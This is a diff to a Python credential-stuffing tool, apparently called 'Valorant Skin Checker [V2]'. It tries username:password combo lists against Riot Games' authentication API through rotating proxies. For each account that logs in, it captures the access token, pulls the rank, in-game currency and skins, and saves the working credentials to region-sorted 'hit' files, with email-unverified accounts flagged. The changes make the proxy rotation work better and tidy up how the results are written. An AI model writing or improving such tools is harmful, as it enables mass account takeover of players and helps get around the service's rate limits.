@@ -1,5 +1,6 @@
 import os
 os.system("pip install -r requirements.txt")
+from pathlib import Path
 from requests import session as sesh
 import requests
 from requests.adapters import HTTPAdapter
@@ -18,8 +19,11 @@ import random
 from colorama import Fore
 
 
-p = open("proxy.txt", "r")
-proxy = [ss.rstrip() for ss in p.readlines()]
+with open("proxy.txt", "r", encoding="utf-8") as p:
+    proxy = [ss.rstrip() for ss in p.readlines() if ss.strip()]
+
+RESULT_DIR = Path("results")
+RESULT_DIR.mkdir(exist_ok=True)
 
 
 global usernames, passwords
@@ -43,7 +47,7 @@ def center(var:str, space:int=None): # From Pycenter
 
 num=0
 def load_combos():
-    global usernames, passwords
+    global usernames, passwords, num
     gui()
     print()
     input("Press ENTER to select combos")
@@ -110,14 +114,29 @@ def checker(username, password):
         'Content-Type': 'application/json',
         'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
     }
-    r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies={'http': proxy}, timeout=5)
+    proxy_value = random.choice(proxy) if proxy else None
+    proxies = {'http': proxy_value, 'https': proxy_value} if proxy_value else None
+    r = session.post(
+        'https://auth.riotgames.com/api/v1/authorization',
+        json=data,
+        headers=headers,
+        proxies=proxies,
+        timeout=5
+    )
     data = {
         'type': 'auth',
         'username': username,
         'password': password
     }
-    r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies={'http': proxy}, timeout=5)
+    r2 = session.put(
+        'https://auth.riotgames.com/api/v1/authorization',
+        json=data,
+        headers=headers,
+        proxies=proxies,
+        timeout=5
+    )
     data = r2.json()
+    token = None
     if "access_token" in r2.text:
         pattern = compile(
             'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
@@ -131,11 +150,13 @@ def checker(username, password):
         banned = banned +1
         bad = bad+1
         cpm1 += 1
-        banneds = open("results//Fail.txt", "a+")
+        with open(RESULT_DIR / "Fail.txt", "a+", encoding="utf-8") as banneds:
+            pass
         kekeds = kekeds + 1
-        banneds.close()
+        return
     else:
         errors = errors+1
+        return
     headers = {
         'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
         'Authorization': f'Bearer {token}',
@@ -208,24 +229,19 @@ def checker(username, password):
                 userSkins.append(name)
                 SkinStr += "| " + name + "\n"
     if Region == "eu":
-            euwe = open("results//eu.txt", "a+")
-            euwe.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-            euwe.close()
+            with open(RESULT_DIR / "eu.txt", "a+", encoding="utf-8") as euwe:
+                euwe.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
     if Region == "na":
-            naeuw = open("results//na.txt", "a+")
-            naeuw.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-            naeuw.close()
+            with open(RESULT_DIR / "na.txt", "a+", encoding="utf-8") as naeuw:
+                naeuw.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
     if Region == "ap":
-            SaveHits1 = open("results//ap.txt", "a+")
-            SaveHits1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-            SaveHits1.close()
+            with open(RESULT_DIR / "ap.txt", "a+", encoding="utf-8") as SaveHits1:
+                SaveHits1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
     if EmailVerified == "false":
-            SaveHits2 = open("results//FA.txt", "a+")
-            SaveHits2.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-            SaveHits2.close()   
-    SaveHits = open("results//All.txt", "a+")
-    SaveHits.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-    SaveHits.close()
+            with open(RESULT_DIR / "FA.txt", "a+", encoding="utf-8") as SaveHits2:
+                SaveHits2.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+    with open(RESULT_DIR / "All.txt", "a+", encoding="utf-8") as SaveHits:
+        SaveHits.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
 def gui():
         os.system('cls')
         ctypes.windll.kernel32.SetConsoleTitleW(f'Valorant Skin Checker [V2]') 
